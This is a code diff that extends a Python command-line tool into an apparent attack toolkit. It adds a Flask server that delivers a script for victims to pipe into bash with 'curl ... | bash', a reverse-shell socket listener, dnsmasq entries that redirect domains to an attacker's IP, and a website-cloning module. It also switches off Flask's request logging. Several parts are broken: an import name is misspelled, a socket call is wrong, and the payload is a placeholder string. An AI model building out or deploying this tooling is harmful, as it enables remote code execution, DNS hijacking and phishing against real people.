@@ -1,82 +1,18 @@
-from os import system
 import modules.plugin as plugin
+from os import system
+import threading
+import logging
+from time import sleep
+from concurrent.futures import ThreadPoolExecuter
+
+log = logging.getLogger('werkzeug')
+log.disabled = True
 
 class colors:
     """
     Module made by @venaxyt on Github
     https://github.com/venaxyt/gratient
     """
-    def black(text):
-        system(""); faded = ""
-        for line in text.splitlines():
-            red = 0; green = 0; blue = 0
-            for character in line:
-                red += 3; green += 3; blue += 3
-                if red > 255 and green > 255 and blue > 255:
-                    red = 255; green = 255; blue = 255
-                faded += (f"\033[38;2;{red};{green};{blue}m{character}\033[0m")
-            faded += "\n"
-        return faded
-
-    def green(text):
-        system(""); faded = ""
-        for line in text.splitlines():
-            blue = 100
-            for character in line:
-                blue += 2
-                if blue > 255:
-                    blue = 255
-                faded += (f"\033[38;2;0;255;{blue}m{character}\033[0m")
-            faded += "\n"
-        return faded
-
-    def blue(text):
-        system(""); faded = ""
-        for line in text.splitlines():
-            green = 0
-            for character in line:
-                green += 3
-                if green > 255:
-                    green = 255
-                faded += (f"\033[38;2;0;{green};255m{character}\033[0m")
-            faded += "\n"
-        return faded
-
-    def purple(text):
-        system(""); faded = ""
-        for line in text.splitlines():
-            red = 35
-            for character in line:
-                red += 3
-                if red > 255:
-                    red = 255
-                faded += (f"\033[38;2;{red};0;220m{character}\033[0m")
-            faded += "\n"
-        return faded
-
-    def yellow(text):
-        system(""); faded = ""
-        for line in text.splitlines():
-            red = 0
-            for character in line:
-                if not red > 200:
-                    red += 3
-                faded += (f"\033[38;2;{red};255;0m{character}\033[0m")
-            faded += "\n"
-        return faded
-
-    def red(text):
-        system(""); faded = ""
-        for line in text.splitlines():
-            green = 250
-            for character in line:
-                green -= 5
-                if green < 0:
-                    green = 0
-                faded += (f"\033[38;2;255;{green};0m{character}\033[0m")
-            faded += "\n"
-        return faded
-
     def sunset(text):
         system(""); faded = ""
         for line in text.splitlines():
@@ -104,24 +40,189 @@ class essensials:
             else: return False
         return a
 
+    def closeThread(thread):
+        try:
+            thread.exit()
+            return True
+        except:
+            return False
+
+class EndpointAction(object):
+    """
+    https://stackoverflow.com/questions/40460846/using-flask-inside-class
+
+    line 64
+    """
+
+    def __init__(self, action, send="no"):
+        try:
+            from flask import Flask, Response
+        except ImportError:
+            print("[!] flask needed for script download; skipping...")
+            return
+            
+        self.action = action
+        self.response = send
+
+    def __call__(self, send="ok"):
+        self.action()
+        return self.response
+
+
+class FlaskAppWrapper(object):
+    """
+    https://stackoverflow.com/questions/40460846/using-flask-inside-class
+
+    i edited it and only god knows how it works
+    """
+    app = None
+
+    def __init__(self, name):
+        try:
+            from flask import Flask, Response
+        except ImportError:
+            print("[!] flask needed for script download; skipping...")
+            return
+            
+        self.app = Flask(name)
+
+    def run(self, port, ip):
+        self.app.run(ip, port=port)
+
+    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None, send="ok"):
+        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler, send=handler()))
+
 class modules:
     """
     built in scripts and stuff
     """
+    class reverse_shell:
+        def flaskThread(a, ip, port:int):
+            with ThreadPoolExecuter(max_workers=1) as pool:
+                site = pool.submit(a.run, port, ip)
+
+                while True:
+                    if sysVar.rsSite:
+                        pass
+                    else:
+                        site.shutdown()
+                        pool.shutdown()
+
+        def download():
+            """
+            flask download handler
+            """
+            return "bniobnjghoj"
+
+        def initDownload(args:list):
+            """
+            execute the download server for quick execution/injection
+            """
+
+            if sysVar.rsSite == True:
+                if input("[!] flask server already running; close it? [Y/n]").lower() == "y":
+                    sysVar.rsSite = False
+                    print("[-] closed site")
+                    return
+                else:
+                    return
+
+            sysVar.rsSite = True
+
+            try:
+                ip = args[1]
+                port = args[2]
+            except:
+                print("not enough args")
+                return
+                
+            a = FlaskAppWrapper('wrap')
+            a.add_endpoint(endpoint='/', endpoint_name='m', handler=modules.reverse_shell.download)
+
+            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | bash\" to run script") 
+            
+            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()
+
+            sleep(1)
+
+        def initSocket(args:list):
+            """
+            main TCP socket client
+            """
+
+            try:
+                import socket
+            except ImportError:
+                print("[!] socket(s) required for this")
+
+            mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generate tcp socket
+
+            mainSock.bind((args[1], int(args[2])))
+
+            mainSock.listen()
+
+            while True:
+                conn, addr =  mainSock.connect()
+
+                with conn:
+                    conn.sendall("test".encode('ascii'))
+
+            
     class dns:
         def start(args:list):
-            print(args)
-        def add_entry(args:list):
-            print(args[1])
-        def help():
-            return """DNS server to reroute people to ur server"""
+            try:
+                import os
+            except ImportError:
+                print("[!] unable to import os")
+            
+            a = essensials.sanitized_input("[?] this plugin requires DNSMasq and runs it's daemon, confirm? [Y/n]").lower()
 
-    class replicate:
-        def site(args:list):
+            if a == "y":
+                os.system("systemctl start dnsmasq")
+                print("[!] started")
+                return True
+            else:
+                print("[X] skipped")
+                return False
+
+        def add_entry(args:list):
+            file_data = None
+
+            try:
+                domain = args[1]
+                ip = args[2]
+            except IndexError:
+                print("[!] not enough args; dns-entry (domain) (server redirect ip)")
+                return False
+
+            try:
+                with open("/etc/dnsmasq.conf", "r") as f:
+                    file_data = f.read().split("\n")
+            except FileNotFoundError:
+                print("[!] /etc/dnsmasq.conf not found!")
+                return
+
+            if "address {}/{}\n".format(domain, ip) in file_data: #sanity check
+                print("[!] entry already added!")
+                return
+            
+            try:
+                with open("/etc/dnsmasq.conf", "a") as f:
+                    f.write("address {}/{}\n".format(domain, ip))
+                    f.flush()
+            except FileNotFoundError:
+                print("[!] /etc/dnsmasq.conf not found!")
+                return
+
+            print("[+] DNS entry added")
+
+    class clone:
+        def cloneSite(args:list):
             try:
                 import httpx
             except ImportError: # httpx not available
                 print("[!] HTTPX needed for this module; pip install httpx")
+                return
 
             if args[3] != "0": # if proxy given
                 proxy = {"http": args[3].split(":")} # set our proxy to that
@@ -144,7 +245,7 @@ class sysVar:
     modules = { # built in modules
         "dns": {
             "module": modules.dns.start,
-            "help": modules.dns.help()
+            "help": "start DNSmasq daemon"
         },
 
         "dns-entry": {
@@ -152,13 +253,25 @@ class sysVar:
             "help": "add a dns entry to the dns server"
         },
 
-        "replicate": {
-            "module": modules.replicate.site,
+        "cloneSite": {
+            "module": modules.clone.cloneSite,
             "help": "download a site's HTML"
-        }
+        },
+
+        "rs-download": {
+            "module": modules.reverse_shell.initDownload,
+            "help": "start http flask server to download file from"
+        },
+
+        "rs-socket": {
+            "module": modules.reverse_shell.initSocket,
+            "help": "probe to client ip and attempt to connect"
+        },
     }
 
     runnable_plugins = []
+    rsSite = False
+    activeThreads = []
 
 if __name__ == "__main__":
     plugins = plugin.load(folder="modules") # load
@@ -188,7 +301,7 @@ if __name__ == "__main__":
             sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["module"] = None # set module as None to show it's not ours
 
     while True:
-        c = essensials.sanitized_input("\nalpine#>", q=True) # q=True to quit if ctrl+c
+        c = essensials.sanitized_input("\nalpine#> ", q=True) # q=True to quit if ctrl+c
 
         if c == "help":
             for module in sysVar.modules: # cycle through each
